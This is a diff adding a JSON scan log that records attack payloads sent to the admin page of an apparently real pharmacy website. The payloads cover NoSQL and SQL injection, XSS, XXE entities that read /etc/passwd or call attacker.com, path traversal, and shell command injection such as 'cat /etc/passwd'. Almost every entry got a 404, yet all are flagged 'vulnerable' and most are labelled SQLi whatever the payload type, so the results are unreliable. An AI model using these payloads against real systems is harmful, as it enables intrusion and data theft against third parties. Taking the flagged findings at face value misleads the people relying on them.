@@ -1,0 +1,1064 @@
+[
+  {
+    "payload": "{\"$ne\": \"\"}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24ne%22%3A+%22%22%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 283,
+    "response": null
+  },
+  {
+    "payload": "{\"$ne\": null}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24ne%22%3A+null%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 282,
+    "response": null
+  },
+  {
+    "payload": "{\"$ne\": 0}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24ne%22%3A+0%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 283,
+    "response": null
+  },
+  {
+    "payload": "{\"$where\": \"true\"}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24where%22%3A+%22true%22%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 283,
+    "response": null
+  },
+  {
+    "payload": "{\"$where\": \"1==1\"}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24where%22%3A+%221%3D%3D1%22%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 283,
+    "response": null
+  },
+  {
+    "payload": "{\"$where\": \"this.username == this.password\"}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24where%22%3A+%22this.username+%3D%3D+this.password%22%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 286,
+    "response": null
+  },
+  {
+    "payload": "{\"$where\": \"this.username.length > 0\"}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24where%22%3A+%22this.username.length+%3E+0%22%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 286,
+    "response": null
+  },
+  {
+    "payload": "{\"$gt\": 0}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24gt%22%3A+0%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 286,
+    "response": null
+  },
+  {
+    "payload": "{\"$regex\": \".*\"}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24regex%22%3A+%22.%2A%22%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 287,
+    "response": null
+  },
+  {
+    "payload": "{\"$gt\": \"\"}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24gt%22%3A+%22%22%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 303,
+    "response": null
+  },
+  {
+    "payload": "{\"$or\": [{\"username\": {\"$regex\": \".*\"}}, {\"password\": {\"$regex\": \".*\"}}]}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24or%22%3A+%5B%7B%22username%22%3A+%7B%22%24regex%22%3A+%22.%2A%22%7D%7D%2C+%7B%22password%22%3A+%7B%22%24regex%22%3A+%22.%2A%22%7D%7D%5D%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "{\"$or\": [{\"username\": {\"$ne\": null}}, {\"password\": {\"$ne\": null}}]}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24or%22%3A+%5B%7B%22username%22%3A+%7B%22%24ne%22%3A+null%7D%7D%2C+%7B%22password%22%3A+%7B%22%24ne%22%3A+null%7D%7D%5D%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "{\"$not\": {\"username\": null}}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24not%22%3A+%7B%22username%22%3A+null%7D%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "<script>alert(1)</script>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 69,
+    "response": null
+  },
+  {
+    "payload": "{\"$and\": [{\"username\": {\"$ne\": null}}, {\"password\": {\"$ne\": null}}]}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24and%22%3A+%5B%7B%22username%22%3A+%7B%22%24ne%22%3A+null%7D%7D%2C+%7B%22password%22%3A+%7B%22%24ne%22%3A+null%7D%7D%5D%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 75,
+    "response": null
+  },
+  {
+    "payload": "><img src=x onerror=alert(1)>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 73,
+    "response": null
+  },
+  {
+    "payload": "<svg onload=alert(1)>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Csvg+onload%3Dalert%281%29%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "{\"$nor\": [{\"username\": null}, {\"password\": null}]}",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7B%22%24nor%22%3A+%5B%7B%22username%22%3A+null%7D%2C+%7B%22password%22%3A+null%7D%5D%7D",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 76,
+    "response": null
+  },
+  {
+    "payload": "<img src=x onerror=alert(1)>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 74,
+    "response": null
+  },
+  {
+    "payload": "javascript:alert(1)",
+    "url": "https://kpharmacyllc.com/admin.html?test=javascript%3Aalert%281%29",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 75,
+    "response": null
+  },
+  {
+    "payload": "<textarea onfocus=alert(1) autofocus>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 66,
+    "response": null
+  },
+  {
+    "payload": "<body onload=alert(1)>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cbody+onload%3Dalert%281%29%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "<input onfocus=alert(1) autofocus>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cinput+onfocus%3Dalert%281%29+autofocus%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "<keygen onfocus=alert(1) autofocus>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 68,
+    "response": null
+  },
+  {
+    "payload": "<details open ontoggle=alert(1)>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cdetails+open+ontoggle%3Dalert%281%29%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 67,
+    "response": null
+  },
+  {
+    "payload": "<iframe src=javascript:alert(1)></iframe>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 73,
+    "response": null
+  },
+  {
+    "payload": "<audio src=x onerror=alert(1)>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Caudio+src%3Dx+onerror%3Dalert%281%29%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 69,
+    "response": null
+  },
+  {
+    "payload": "<video><source onerror=alert(1)>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 70,
+    "response": null
+  },
+  {
+    "payload": "<select onfocus=alert(1) autofocus>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cselect+onfocus%3Dalert%281%29+autofocus%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 89,
+    "response": null
+  },
+  {
+    "payload": "<marquee onstart=alert(1)>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cmarquee+onstart%3Dalert%281%29%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 67,
+    "response": null
+  },
+  {
+    "payload": "<object data=\"javascript:alert(1)\">",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cobject+data%3D%22javascript%3Aalert%281%29%22%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 74,
+    "response": null
+  },
+  {
+    "payload": "<embed src=\"javascript:alert(1)\">",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Cembed+src%3D%22javascript%3Aalert%281%29%22%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "' OR '1'='1",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+OR+%271%27%3D%271",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "' OR '1'='1' --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+OR+%271%27%3D%271%27+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "<table><td background=\"javascript:alert(1)\">",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3Ctable%3E%3Ctd+background%3D%22javascript%3Aalert%281%29%22%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 74,
+    "response": null
+  },
+  {
+    "payload": "' OR 1=1#",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+OR+1%3D1%23",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 70,
+    "response": null
+  },
+  {
+    "payload": "' OR 1=1 --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+OR+1%3D1+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 73,
+    "response": null
+  },
+  {
+    "payload": "' OR 1=1/*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+OR+1%3D1%2F%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 70,
+    "response": null
+  },
+  {
+    "payload": "' OR 'a'='a",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+OR+%27a%27%3D%27a",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 69,
+    "response": null
+  },
+  {
+    "payload": "' OR '' = '",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+OR+%27%27+%3D+%27",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "' AND sleep(3) --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+AND+sleep%283%29+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "' AND 1=1 --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+AND+1%3D1+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 73,
+    "response": null
+  },
+  {
+    "payload": "' OR sleep(5)--",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+OR+sleep%285%29--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 73,
+    "response": null
+  },
+  {
+    "payload": "' UNION SELECT 1,2,3 --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+UNION+SELECT+1%2C2%2C3+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 73,
+    "response": null
+  },
+  {
+    "payload": "' AND 1=2 --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+AND+1%3D2+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 74,
+    "response": null
+  },
+  {
+    "payload": "' UNION SELECT null, null, null --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+UNION+SELECT+null%2C+null%2C+null+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 73,
+    "response": null
+  },
+  {
+    "payload": "' UNION SELECT username, password FROM users --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+UNION+SELECT+username%2C+password+FROM+users+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "admin' or '1'='1",
+    "url": "https://kpharmacyllc.com/admin.html?test=admin%27+or+%271%27%3D%271",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 70,
+    "response": null
+  },
+  {
+    "payload": "\" OR \"1\"=\"1",
+    "url": "https://kpharmacyllc.com/admin.html?test=%22+OR+%221%22%3D%221",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "\" OR sleep(3) --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%22+OR+sleep%283%29+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 75,
+    "response": null
+  },
+  {
+    "payload": "\" AND 1=1 --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%22+AND+1%3D1+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 75,
+    "response": null
+  },
+  {
+    "payload": "1' AND 1=2 --",
+    "url": "https://kpharmacyllc.com/admin.html?test=1%27+AND+1%3D2+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 74,
+    "response": null
+  },
+  {
+    "payload": "\" AND 1=2 --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%22+AND+1%3D2+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 76,
+    "response": null
+  },
+  {
+    "payload": "') OR ('1'='1",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27%29+OR+%28%271%27%3D%271",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 78,
+    "response": null
+  },
+  {
+    "payload": "1' AND 1=1 --",
+    "url": "https://kpharmacyllc.com/admin.html?test=1%27+AND+1%3D1+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 76,
+    "response": null
+  },
+  {
+    "payload": "admin')--",
+    "url": "https://kpharmacyllc.com/admin.html?test=admin%27%29--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 78,
+    "response": null
+  },
+  {
+    "payload": "' OR EXISTS(SELECT * FROM users) --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 80,
+    "response": null
+  },
+  {
+    "payload": "' AND EXISTS(SELECT * FROM users WHERE username='admin') --",
+    "url": "https://kpharmacyllc.com/admin.html?test=%27+AND+EXISTS%28SELECT+%2A+FROM+users+WHERE+username%3D%27admin%27%29+--",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><foo>&xxe;</foo>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fproc%2Fversion%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 76,
+    "response": null
+  },
+  {
+    "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ftp://attacker.com/steal\">]><foo>&xxe;</foo>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22ftp%3A%2F%2Fattacker.com%2Fsteal%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 75,
+    "response": null
+  },
+  {
+    "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"gopher://attacker.com/steal\">]><foo>&xxe;</foo>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22gopher%3A%2F%2Fattacker.com%2Fsteal%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 78,
+    "response": null
+  },
+  {
+    "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/steal\">]><foo>&xxe;</foo>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22http%3A%2F%2Fattacker.com%2Fsteal%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 79,
+    "response": null
+  },
+  {
+    "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 78,
+    "response": null
+  },
+  {
+    "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22jar%3Afile%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 79,
+    "response": null
+  },
+  {
+    "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "url": "https://kpharmacyllc.com/admin.html?test=..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fhosts%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 96,
+    "response": null
+  },
+  {
+    "payload": "../etc/passwd",
+    "url": "https://kpharmacyllc.com/admin.html?test=..%2Fetc%2Fpasswd",
+    "status_code": 403,
+    "vulnerable": true,
+    "vuln_type": "Interesting Response",
+    "response_time_ms": 97,
+    "response": null
+  },
+  {
+    "payload": "....//....//....//etc/passwd",
+    "url": "https://kpharmacyllc.com/admin.html?test=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd",
+    "status_code": 403,
+    "vulnerable": true,
+    "vuln_type": "Interesting Response",
+    "response_time_ms": 102,
+    "response": null
+  },
+  {
+    "payload": "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
+    "url": "https://kpharmacyllc.com/admin.html?test=..%25c1%259c..%25c1%259c..%25c1%259cetc%25c1%259cpasswd",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 85,
+    "response": null
+  },
+  {
+    "payload": "/etc/passwd%00",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2Fetc%2Fpasswd%2500",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 85,
+    "response": null
+  },
+  {
+    "payload": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
+    "url": "https://kpharmacyllc.com/admin.html?test=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 85,
+    "response": null
+  },
+  {
+    "payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+    "url": "https://kpharmacyllc.com/admin.html?test=..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 88,
+    "response": null
+  },
+  {
+    "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
+    "url": "https://kpharmacyllc.com/admin.html?test=..%25252F..%25252F..%25252Fetc%25252Fpasswd",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 90,
+    "response": null
+  },
+  {
+    "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
+    "url": "https://kpharmacyllc.com/admin.html?test=..%252F..%252F..%252Fetc%252Fpasswd",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 91,
+    "response": null
+  },
+  {
+    "payload": "/etc/passwd%00.txt",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2Fetc%2Fpasswd%2500.txt",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 95,
+    "response": null
+  },
+  {
+    "payload": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "url": "https://kpharmacyllc.com/admin.html?test=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 84,
+    "response": null
+  },
+  {
+    "payload": "; ls -la",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3B+ls+-la",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 87,
+    "response": null
+  },
+  {
+    "payload": "| ls -la",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7C+ls+-la",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 87,
+    "response": null
+  },
+  {
+    "payload": "` ls -la `",
+    "url": "https://kpharmacyllc.com/admin.html?test=%60+ls+-la+%60",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 83,
+    "response": null
+  },
+  {
+    "payload": "& ls -la",
+    "url": "https://kpharmacyllc.com/admin.html?test=%26+ls+-la",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 85,
+    "response": null
+  },
+  {
+    "payload": "& cat /etc/passwd",
+    "url": "https://kpharmacyllc.com/admin.html?test=%26+cat+%2Fetc%2Fpasswd",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 84,
+    "response": null
+  },
+  {
+    "payload": "; cat /etc/passwd",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3B+cat+%2Fetc%2Fpasswd",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 85,
+    "response": null
+  },
+  {
+    "payload": "$( ls -la )",
+    "url": "https://kpharmacyllc.com/admin.html?test=%24%28+ls+-la+%29",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 88,
+    "response": null
+  },
+  {
+    "payload": "$( cat /etc/passwd )",
+    "url": "https://kpharmacyllc.com/admin.html?test=%24%28+cat+%2Fetc%2Fpasswd+%29",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 83,
+    "response": null
+  },
+  {
+    "payload": "` cat /etc/passwd `",
+    "url": "https://kpharmacyllc.com/admin.html?test=%60+cat+%2Fetc%2Fpasswd+%60",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 87,
+    "response": null
+  },
+  {
+    "payload": "; whoami",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3B+whoami",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 83,
+    "response": null
+  },
+  {
+    "payload": "| cat /etc/passwd",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7C+cat+%2Fetc%2Fpasswd",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 105,
+    "response": null
+  },
+  {
+    "payload": "| whoami",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7C+whoami",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 81,
+    "response": null
+  },
+  {
+    "payload": "` whoami `",
+    "url": "https://kpharmacyllc.com/admin.html?test=%60+whoami+%60",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 70,
+    "response": null
+  },
+  {
+    "payload": "& whoami",
+    "url": "https://kpharmacyllc.com/admin.html?test=%26+whoami",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 74,
+    "response": null
+  },
+  {
+    "payload": "; id",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3B+id",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "$( whoami )",
+    "url": "https://kpharmacyllc.com/admin.html?test=%24%28+whoami+%29",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "| id",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7C+id",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 70,
+    "response": null
+  },
+  {
+    "payload": "& id",
+    "url": "https://kpharmacyllc.com/admin.html?test=%26+id",
+    "status_code": 404,
+    "vulnerable": true,
